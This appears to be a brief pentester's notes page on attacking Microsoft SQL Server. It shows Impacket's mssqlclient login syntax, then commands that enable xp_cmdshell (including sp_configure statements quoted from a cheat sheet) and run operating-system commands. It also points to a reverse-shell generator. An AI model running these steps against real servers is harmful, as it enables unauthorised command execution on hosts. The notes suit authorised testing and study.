# MsSQL

## Impacket mssqlclient.py
On Kali it is installed as `impacket-mssqlclient`
I used it after obtaining credentials another way
```
impacket-mssqlclient [[domain/]username[:password]@]<targetName or address> -windows-auth
```
After authenticating
```
enable_xp_cmdshell
RECONFIGURE
xp_cmdshell <command to execute>

# Simple reverse shell
# https://www.revshells.com/
# PowerShell #3 (Base64)
```
More advanced way to turn on xp_cmdshell
https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
```
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell
first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
```
